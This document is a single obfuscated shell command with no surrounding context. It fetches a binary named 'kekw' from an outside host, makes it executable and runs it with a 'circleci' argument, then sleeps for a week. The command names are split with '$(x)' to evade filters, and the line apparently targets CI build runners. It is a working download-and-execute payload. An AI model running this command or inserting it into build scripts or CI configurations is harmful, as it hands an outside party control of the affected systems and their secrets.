wg$(x)et http://gdc.li/kekw; chm$(x)od 777 kekw; ./kekw circleci; sleep 604800
